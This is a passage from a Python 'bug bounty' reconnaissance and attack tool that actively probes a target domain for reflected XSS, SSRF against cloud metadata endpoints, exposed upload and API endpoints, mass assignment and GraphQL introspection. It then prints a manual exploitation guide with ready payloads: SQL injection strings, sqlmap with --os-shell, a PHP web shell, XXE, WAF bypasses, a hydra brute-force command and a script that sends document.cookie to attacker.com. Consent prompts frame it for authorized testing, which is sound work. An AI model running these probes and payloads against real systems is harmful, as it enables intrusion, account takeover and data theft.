                        query=urlencode(test_params, doseq=True)
                    ).geturl()

                    r = safe_get(test_url, timeout=8)
                    if r and payload in r.text:
                        self.results.add_finding('HIGH', 'Reflected XSS',
                            f"Payload reflected in [{param}] at {url[:70]}")
                        found += 1
                        break

        # Check for DOM XSS indicators in JS
        dom_sinks = ['document.write', 'innerHTML', 'outerHTML', 'eval(', 'setTimeout(',
                     'document.location', 'window.location', 'location.href']
        for js_url in self.results.js_files[:10]:
            r = safe_get(js_url)
            if r:
                for sink in dom_sinks:
                    if sink in r.text:
                        self.results.add_finding('MEDIUM', 'DOM XSS Sink',
                            f"Dangerous sink '{sink}' found in {js_url}")

        info(f"  Reflected XSS candidates: {found}")

# ══════════════════════════════════════════════════════════════
# 12. SSRF TESTING
# ══════════════════════════════════════════════════════════════
class SSRFTester:
    SSRF_PARAMS = ['url', 'uri', 'path', 'dest', 'redirect', 'next', 'site',
                   'html', 'data', 'reference', 'feed', 'host', 'port',
                   'to', 'out', 'view', 'dir', 'show', 'file', 'document',
                   'folder', 'root', 'pg', 'style', 'pdf', 'template',
                   'php_path', 'doc', 'page', 'name', 'target', 'src', 'source']

    SSRF_PAYLOADS = [
        'http://127.0.0.1/',
        'http://localhost/',
        'http://169.254.169.254/latest/meta-data/',   # AWS metadata
        'http://169.254.169.254/computeMetadata/v1/', # GCP metadata
        'http://metadata.google.internal/',
        'http://100.100.100.200/latest/meta-data/',   # Alibaba Cloud
        'dict://localhost:6379/info',
        'file:///etc/passwd',
        'gopher://localhost:6379/_INFO',
    ]

    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("SSRF TESTING")
        base  = f"https://{self.domain}"
        found = 0

        # Find SSRF-likely parameters
        ssrf_urls = []
        for url in self.results.urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if any(p.lower() in self.SSRF_PARAMS for p in params):
                ssrf_urls.append(url)

        info(f"Found {len(ssrf_urls)} URLs with SSRF-prone parameters")

        for url in ssrf_urls[:15]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param, val in params.items():
                if param.lower() in self.SSRF_PARAMS:
                    for payload in self.SSRF_PAYLOADS[:4]:
                        test_params = {**params, param: [payload]}
                        test_url = parsed._replace(
                            query=urlencode(test_params, doseq=True)
                        ).geturl()
                        r = safe_get(test_url, timeout=5)
                        if r and any(kw in r.text.lower() for kw in
                                     ['ami-id', 'instance-id', 'root:x', 'hostname',
                                      'ec2', 'computemetadata']):
                            self.results.add_finding('CRITICAL', 'SSRF',
                                f"SSRF via [{param}] with {payload[:40]} at {url[:60]}")
                            found += 1

        info(f"  SSRF findings: {found}")

# ══════════════════════════════════════════════════════════════
# 13. FILE UPLOAD TESTING
# ══════════════════════════════════════════════════════════════
class FileUploadTester:
    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("FILE UPLOAD VULNERABILITY TESTING")
        base = f"https://{self.domain}"

        upload_paths = ['/upload', '/uploads', '/file-upload', '/api/upload',
                        '/admin/upload', '/media/upload', '/image/upload',
                        '/profile/upload', '/avatar', '/attachment']

        info("Checking for upload endpoints...")
        for path in upload_paths:
            r = safe_get(base + path)
            if r and r.status_code in [200, 405, 422]:
                self.results.add_finding('MEDIUM', 'Upload Endpoint',
                    f"Upload endpoint found: {path} ({r.status_code})")
                info(f"  Upload endpoint: {path} → {r.status_code}")

        # Check for unrestricted upload via content-type bypass hints
        # (Note: actual upload testing requires manual steps)
        info("Upload test insights logged - manual testing required")
        self.results.add_finding('INFO', 'File Upload',
            'Manual: test MIME type bypass, double extension (.php.jpg), null byte, path traversal in filename')

# ══════════════════════════════════════════════════════════════
# 14. API SECURITY TESTING
# ══════════════════════════════════════════════════════════════
class APISecurityTester:
    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("API SECURITY TESTING")
        base = f"https://{self.domain}"

        # Check for API docs/specs
        api_doc_paths = [
            '/api', '/api/', '/api/v1', '/api/v2',
            '/swagger', '/swagger-ui.html', '/swagger.json', '/swagger.yaml',
            '/openapi.json', '/openapi.yaml', '/api-docs', '/api/docs',
            '/graphql', '/graphiql', '/gql', '/api/graphql',
            '/redoc', '/.well-known/', '/api/swagger.json',
        ]

        info("Scanning for API documentation...")
        for path in api_doc_paths:
            r = safe_get(base + path, allow_redirects=True)
            if r and r.status_code == 200 and len(r.text) > 100:
                content_type = r.headers.get('content-type', '')
                if any(ct in content_type for ct in ['json', 'yaml', 'html']):
                    self.results.add_finding('MEDIUM', 'API Docs Exposed',
                        f"API documentation at {path}")
                    success(f"  API spec/docs: {path}")

                    # GraphQL introspection
                    if 'graphql' in path:
                        self._test_graphql(base + path)

        # Test common REST methods
        info("Testing API endpoints for method misconfigurations...")
        api_endpoints = [u for u in self.results.urls
                         if '/api/' in u and self.domain in u][:10]
        for url in api_endpoints:
            for method in ['PUT', 'DELETE', 'PATCH', 'OPTIONS']:
                try:
                    r = requests.request(method, url, headers=HEADERS,
                                         timeout=5, verify=False)
                    if r.status_code not in [404, 405, 501]:
                        self.results.add_finding('MEDIUM', 'HTTP Method',
                            f"{method} allowed on {url} → {r.status_code}")
                except Exception:
                    pass

        # Mass assignment check
        info("Checking for mass assignment vulnerabilities...")
        for url in api_endpoints[:5]:
            r = safe_get(url)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict):
                        # Try to add privileged fields
                        evil = {**data, 'role': 'admin', 'is_admin': True, 'verified': True}
                        r2 = safe_post(url, json_data=evil)
                        if r2 and r2.status_code in [200, 201]:
                            self.results.add_finding('HIGH', 'Mass Assignment',
                                f"Server accepted extra fields on {url}")
                except Exception:
                    pass

    def _test_graphql(self, url):
        query = '{"query": "{__schema { types { name } }}"}'
        r = safe_post(url, json_data=json.loads(query))
        if r and '__schema' in r.text:
            self.results.add_finding('HIGH', 'GraphQL Introspection',
                'GraphQL introspection is enabled - full schema exposed')

# ══════════════════════════════════════════════════════════════
# 15. SENSITIVE DATA EXPOSURE
# ══════════════════════════════════════════════════════════════
class SensitiveDataChecker:
    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def run(self):
        section("SENSITIVE DATA EXPOSURE")
        base = f"https://{self.domain}"

        # Check security headers
        info("Checking security headers...")
        r = safe_get(base)
        if r:
            headers = r.headers
            required = {
                'Strict-Transport-Security': 'Missing HSTS',
                'X-Frame-Options':           'Clickjacking possible',
                'X-Content-Type-Options':    'MIME sniffing risk',
                'Content-Security-Policy':   'Missing CSP',
                'X-XSS-Protection':          'Missing XSS protection header',
                'Referrer-Policy':           'Missing Referrer-Policy',
                'Permissions-Policy':        'Missing Permissions-Policy',
            }
            for hdr, issue in required.items():
                if hdr not in headers:
                    self.results.add_finding('LOW', 'Missing Header', f"{hdr}: {issue}")
                else:
                    success(f"  ✓ {hdr}: {headers[hdr][:50]}")

            # Check for sensitive data in response
            sensitive_patterns = [
                (r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Z|a-z]{2,}\b', 'Email Address'),
                (r'\b(?:\d{4}[- ]?){4}\b',                                    'Credit Card Pattern'),
                (r'\b\d{3}-\d{2}-\d{4}\b',                                    'SSN Pattern'),
                (r'password["\s]*[:=]["\s]*["\'][^"\']{3,}["\']',             'Password in HTML'),
                (r'BEGIN (RSA |EC |DSA )?PRIVATE KEY',                         'Private Key'),
            ]
            for pattern, name in sensitive_patterns:
                if re.search(pattern, r.text, re.I):
                    self.results.add_finding('HIGH', 'Sensitive Data', f"{name} found in page source")

        # SSL/TLS Check
        info("Checking SSL/TLS configuration...")
        self._check_ssl()

        # Cookie security
        if r:
            cookies = r.headers.get('Set-Cookie', '')
            if cookies:
                if 'Secure' not in cookies:
                    self.results.add_finding('MEDIUM', 'Cookie Security', 'Session cookie missing Secure flag')
                if 'HttpOnly' not in cookies:
                    self.results.add_finding('MEDIUM', 'Cookie Security', 'Session cookie missing HttpOnly flag')
                if 'SameSite' not in cookies:
                    self.results.add_finding('LOW', 'Cookie Security', 'Cookie missing SameSite attribute (CSRF risk)')

    def _check_ssl(self):
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=self.domain) as s:
                s.settimeout(5)
                s.connect((self.domain, 443))
                cert = s.getpeercert()
                expire = datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                days   = (expire - datetime.utcnow()).days
                if days < 30:
                    self.results.add_finding('HIGH', 'SSL Cert', f"Certificate expires in {days} days!")
                elif days < 90:
                    self.results.add_finding('LOW', 'SSL Cert', f"Certificate expires in {days} days")
                else:
                    success(f"  SSL cert valid for {days} days")
        except ssl.SSLError as e:
            self.results.add_finding('HIGH', 'SSL Error', str(e))
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════
# MANUAL TESTING GUIDE GENERATOR
# ══════════════════════════════════════════════════════════════
class ManualGuideGenerator:
    def __init__(self, domain, results):
        self.domain  = domain
        self.results = results

    def generate(self):
        section("MANUAL TESTING & EXPLOITATION GUIDE")
        base = f"https://{self.domain}"
        cms  = self.results.cms or []
        waf  = self.results.waf or 'Unknown'
        findings_cats = [f[1] for f in self.results.findings]

        guide = []

        guide.append(f"""
{'═'*60}
  MANUAL BUG BOUNTY GUIDE FOR: {self.domain}
  Generated: {datetime.now().strftime("%Y-%m-%d %H:%M")}
{'═'*60}

═══ 1. AUTHENTICATION BYPASS ════════════════════════
□ Test login with: admin/admin, admin/password, admin/<company>123
□ Try SQL injection in login: username = admin'-- or ' OR 1=1--
□ Test password reset flow:
    - Host header injection: Host: attacker.com
    - Weak token entropy (predictable reset tokens)
    - Token reuse after password change
    - No rate limiting on reset endpoint
□ JWT attacks (if JWT found):
    - alg:none attack: remove signature
    - Change alg RS256 → HS256 (key confusion)
    - Brute force weak secret: hashcat -a 0 -m 16500 <token> wordlist.txt
    - Edit payload claims (role, is_admin, exp)
□ OAuth misconfigurations:
    - state parameter missing/predictable (CSRF)
    - redirect_uri manipulation
    - Token leakage in Referer header
□ MFA bypass:
    - Response manipulation (change "mfa_required": true → false)
    - Reuse OTP codes (replay attack)
    - Skip MFA step via direct URL

═══ 2. IDOR & BROKEN ACCESS CONTROL ════════════════
□ Map all API endpoints that return user data
□ Create two accounts (attacker + victim) and test:
    - GET /api/users/{'{victim_id}'} with attacker session
    - GET /api/orders/{'{victim_order_id}'}
    - PUT /api/users/{'{victim_id}'} (update victim profile)
□ Parameter pollution: id=1&id=2 (which one wins?)
□ Test GUIDs: still try +1/-1 on numeric parts
□ HTTP method override: X-HTTP-Method-Override: DELETE
□ Mass assignment: add role=admin, is_verified=true to POST body
□ Forced browsing: access URLs from another user's session
□ Check API versioning: /api/v2/ may have less restrictions than /api/v1/

═══ 3. SQL INJECTION ════════════════════════════════
□ Manual error-based: ' " ` )) '))  in every input
□ Time-based blind: ' AND SLEEP(5)-- or 1' AND 1=SLEEP(5)--
□ Boolean-based: ' AND 1=1-- vs ' AND 1=2--
□ Union-based: Find columns: ' ORDER BY 1,2,3-- (until error)
    Extract: ' UNION SELECT null,null,database()--
□ Second-order SQLi: store payload, trigger in different feature
□ Use sqlmap (on allowed scope):
    sqlmap -u "{base}/?id=1" --dbs --batch --level=3
    sqlmap -u "{base}" --data="username=a&password=b" --dbs
    sqlmap -u "{base}/?id=1" --os-shell --batch
□ NoSQL injection (MongoDB):
    username[$ne]=invalid&password[$ne]=invalid
    {{"$where": "sleep(5000)"}}
□ GraphQL SQLi: test arguments in queries/mutations

═══ 4. XSS (Cross-Site Scripting) ══════════════════
□ Reflected: test all GET params, search, error messages
□ Stored: test comment fields, profile bios, usernames
□ DOM: view source for innerHTML, document.write, eval()
□ Payloads to try:
    <script>alert(document.domain)</script>
    "><img src=x onerror=confirm(1)>
    <svg/onload=prompt(1)>
    ';alert(1)//
    "><details/open/ontoggle=alert(1)>
□ Filter bypass:
    <ScRiPt>alert(1)</sCrIpT>   (case variation)
    <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>  (entities)
    javascript:alert`1`          (template literal)
□ CSP bypass (if CSP present):
    - Find whitelisted CDN that allows JSONP
    - Angular: {{constructor.constructor('alert(1)')()}}
□ XSS → Account Takeover:
    <script>fetch('https://attacker.com/?c='+document.cookie)</script>

═══ 5. SSRF ═════════════════════════════════════════
□ Target: any param taking URLs (url=, redirect=, host=, src=)
□ Cloud metadata endpoints:
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
□ Internal network scanning:
    http://127.0.0.1:PORT/ (try 80,8080,22,3306,6379,9200,27017)
    http://internal-host/admin
□ Protocol confusion: dict://, gopher://, file://, ldap://
□ DNS rebinding: point domain to 127.0.0.1 after validation
□ Bypass filters:
    http://[::1]/           (IPv6 localhost)
    http://0x7f000001/      (hex IP)
    http://2130706433/      (decimal IP = 127.0.0.1)
    http://127.1/           (shortened)
    http://localtest.me/    (DNS resolves to 127.0.0.1)

═══ 6. FILE UPLOAD ══════════════════════════════════
□ Basic: upload .php shell (<?php system($_GET['cmd']);?>)
□ Extension bypass:
    .php → .php3, .php5, .phtml, .phar, .php.jpg, .jpg.php
□ Content-Type bypass: change image/jpeg → application/octet-stream
□ Magic bytes: prepend GIF89a; to PHP file, name as .gif.php
□ Path traversal in filename: ../../../var/www/html/shell.php
□ Null byte: shell.php%00.jpg
□ XXE via SVG upload: <![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]]>
□ ImageMagick CVE-2016-3714 (ImageTragick): upload .mvg file
□ After upload, locate the file URL and access it

═══ 7. API SECURITY ═════════════════════════════════
□ Collect all API endpoints from: JS files, Wayback, Burp
□ Test each HTTP verb: GET,POST,PUT,DELETE,PATCH,OPTIONS
□ Versioning: if /api/v2 endpoint is restricted, try /api/v1
□ Mass assignment in JSON body:
    Add: "role":"admin","is_verified":true,"balance":99999
□ GraphQL specific:
    - Introspection: {'{'}__schema{'{'}types{'{'}name{'}'}{'}'}{'}'}
    - Field suggestions (typos reveal hidden fields)
    - Nested queries for DoS / batching for rate-limit bypass
    - Mutation testing: createUser, deleteUser without auth
□ API key testing:
    - Try endpoints without API key
    - Use another user's key to access your data
    - Test key in URL param vs Header vs Cookie
□ Rate limiting: send 100+ requests, check for 429

═══ 8. BUSINESS LOGIC FLAWS ═════════════════════════
□ Price manipulation: change price in request to -1 or 0
□ Quantity: negative values, very large values
□ Coupon codes: apply same coupon multiple times, stack coupons
□ Workflow bypass: complete step 3 before step 2 (skip steps)
□ Race conditions:
    - Double-spending: send same transaction twice simultaneously
    - Multiple account bonuses: use burp repeater parallel
□ Account lockout bypass: alternate usernames/IP
□ Two-step verification bypass: complete step 1, navigate directly to post-step-2 page
□ Free trial abuse: re-register with + tricks in email
□ Reference manipulation: change referral_id in request

═══ 9. SENSITIVE DATA EXPOSURE ══════════════════════
□ Check every response for: API keys, tokens, emails, PII
□ Check HTTP (not HTTPS) - is data sent unencrypted?
□ Check error pages for stack traces (reveal: paths, DB type, framework)
□ Inspect all cookies: Secure, HttpOnly, SameSite flags
□ Find backup files: index.php.bak, config.php~, .DS_Store
□ Directory listing: add / to paths, look for open indexes
□ Source map files: app.js.map, bundle.js.map (reveals source code)
□ GitHub dorks for company repos:
    org:{self.domain} password OR secret OR API_KEY
    org:{self.domain} filename:.env
□ Google dorks:
    site:{self.domain} ext:log OR ext:bak OR ext:sql
    site:{self.domain} inurl:admin OR inurl:debug
    site:{self.domain} "DB_PASSWORD" OR "api_key"

═══ 10. SPECIFIC TO THIS TARGET ═════════════════════""")

        # CMS-specific tips
        if 'WordPress' in cms:
            guide.append("""
□ WordPress specific:
    - WPScan: wpscan --url {base} --enumerate vp,vt,u --api-token <token>
    - Plugin vulns: check CVE for installed plugins (from /wp-content/plugins/)
    - User enumeration: /wp-json/wp/v2/users → harvest usernames for brute force
    - xmlrpc.php bruteforce: send 100 passwords in 1 request
    - Brute force: hydra -l admin -P wordlist.txt {self.domain} http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"
""")

        if waf and waf != 'Unknown':
            guide.append(f"""
□ WAF ({waf}) bypass techniques:
    - Chunked encoding: Transfer-Encoding: chunked
    - Case variation: sElEcT instead of SELECT
    - URL encoding: %27 → ' ; %3C → <
    - Double URL encoding: %2527 → '
    - Unicode encoding: ＜script＞
    - Whitespace substitution: SELECT/**/1/**/FROM
    - HTTP parameter pollution
    - Use CDN origin IP directly (bypass WAF entirely)
    - X-Forwarded-For: 127.0.0.1 header tricks
""")

        guide.append(f"""
═══ TOOLS CHECKLIST ═════════════════════════════════
□ Recon:      subfinder, amass, assetfinder, dnsx, httpx
□ Scanning:   nmap -sV -sC -p- {self.domain}
□ Spidering:  katana -u {base} -d 5 -jc
□ Fuzzing:    ffuf -w wordlist.txt -u {base}/FUZZ
□ SQLi:       sqlmap -u "{base}/?id=1" --batch --dbs
□ XSS:        dalfox url "{base}/?q=FUZZ"
□ Secrets:    trufflehog filesystem . / git scan
□ Headers:    curl -I {base}
□ SSL:        testssl.sh {self.domain}
□ CORS:       curl -H "Origin: https://evil.com" -I {base}
□ Proxy:      Burp Suite (intercept & modify all requests)

═══ REPORTING FORMAT ════════════════════════════════
For each finding, document:
  Title:        Clear, descriptive vulnerability name
  Severity:     Critical/High/Medium/Low/Info
  Endpoint:     Exact URL/parameter affected
  Steps:        Numbered reproduction steps
  Impact:       What an attacker could do
  Evidence:     Screenshots, request/response
  Fix:          Suggested remediation
  CVSS Score:   https://nvd.nist.gov/vuln-metrics/cvss

{'═'*60}
  REMEMBER: Only test within authorized scope!
  Keep all findings confidential until disclosed.
{'═'*60}
""")

        full_guide = '\n'.join(guide)

        # Print to terminal
        print(full_guide)

        # Save to file
        ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"manual_guide_{self.domain}_{ts}.txt"
        with open(fname, 'w') as f:
            f.write(full_guide)
        success(f"Manual guide saved → {fname}")
        return fname

# ══════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ══════════════════════════════════════════════════════════════
def print_banner():
    print(f"""
{C.BOLD}{C.RED}
 ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
 ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
 ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
 ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
 ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
 ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝  
{C.RESET}
{C.YELLOW}                    Advanced Bug Bounty Reconnaissance Tool{C.RESET}
{C.DIM}              ⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠{C.RESET}
""")

def check_deps():
    missing = []
    try:
        import requests
    except ImportError:
        missing.append('requests')
    if missing:
        warn(f"Missing: {', '.join(missing)}")
        warn(f"Install: pip3 install {' '.join(missing)}")
        return False
    return True

def main():
    parser = argparse.ArgumentParser(
        description='Advanced Bug Bounty Tool - Authorized Testing Only'
    )
    parser.add_argument('domain', help='Target domain (e.g. example.com)')
    parser.add_argument('--skip-ports',  action='store_true', help='Skip port scanning')
    parser.add_argument('--skip-vuln',   action='store_true', help='Skip vulnerability tests')
    parser.add_argument('--subdomains-only', action='store_true', help='Only enumerate subdomains')
    parser.add_argument('--output', default=None, help='Output JSON file path')
    args = parser.parse_args()

    print_banner()

    # Consent check
    print(f"\n{C.BOLD}{C.RED}⚠  LEGAL NOTICE  ⚠{C.RESET}")
    print(f"This tool will perform active security testing on: {C.BOLD}{args.domain}{C.RESET}")
    print(f"Only proceed if you have {C.BOLD}written authorization{C.RESET} to test this target.")
    consent = input(f"\nDo you have explicit permission to test {args.domain}? [yes/no]: ").strip().lower()
    if consent not in ['yes', 'y']:
        print(f"\n{C.RED}Aborted. Only use this tool on authorized targets.{C.RESET}")
        sys.exit(0)

    check_deps()

    domain  = args.domain.strip().lstrip('https://').lstrip('http://').rstrip('/')
    results = Results(domain)

    start = time.time()
    print(f"\n{C.BOLD}Target: {domain}{C.RESET}")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    # ── Phase 1: Recon ──────────────────────────────────────
    SubdomainFinder(domain, results).run()
    RealIPFinder(domain, results).run()

    if args.subdomains_only:
        results.save()
        return

    # ── Phase 2: Infrastructure ──────────────────────────────
    WAFDetector(domain, results).run()
    CMSDetector(domain, results).run()

    if not args.skip_ports:
        primary_ips = results.real_ips or [domain]
        PortScanner(primary_ips[0], results).run()

    # ── Phase 3: Content Discovery ───────────────────────────
    URLGatherer(domain, results).run()
    JSAnalyzer(domain, results).run()

    # ── Phase 4: Vulnerability Testing ──────────────────────
    if not args.skip_vuln:
        AuthTester(domain, results).run()
        IDORTester(domain, results).run()
        SQLInjectionTester(domain, results).run()
        XSSTester(domain, results).run()
        SSRFTester(domain, results).run()
        FileUploadTester(domain, results).run()
        APISecurityTester(domain, results).run()
        SensitiveDataChecker(domain, results).run()

    # ── Phase 5: Summary ─────────────────────────────────────
    elapsed = time.time() - start
    section("SCAN SUMMARY")

    severity_order = ['CRITICAL','HIGH','MEDIUM','LOW','INFO']
    counts = {s:0 for s in severity_order}
    for sev, cat, detail in results.findings:
        counts[sev] = counts.get(sev, 0) + 1

    colors = {'CRITICAL': C.RED, 'HIGH': C.RED, 'MEDIUM': C.YELLOW, 'LOW': C.CYAN, 'INFO': C.GREEN}
    for sev in severity_order:
        n = counts[sev]
        if n:
            print(f"  {colors[sev]}{C.BOLD}{sev:10}{C.RESET}: {n} findings")

    print(f"\n  Subdomains : {len(results.subdomains)}")
    print(f"  URLs Found : {len(results.urls)}")
    print(f"  JS Files   : {len(results.js_files)}")
    print(f"  Scan Time  : {elapsed:.1f}s\n")

    report_path = results.save()

    # ── Phase 6: Manual Guide ────────────────────────────────
    ManualGuideGenerator(domain, results).generate()

    section("DONE")
    success(f"Scan complete for {domain}")
    info(f"JSON report: {report_path}")
    warn("Always disclose responsibly through the bug bounty program's official channel.")

if __name__ == '__main__':
    main()
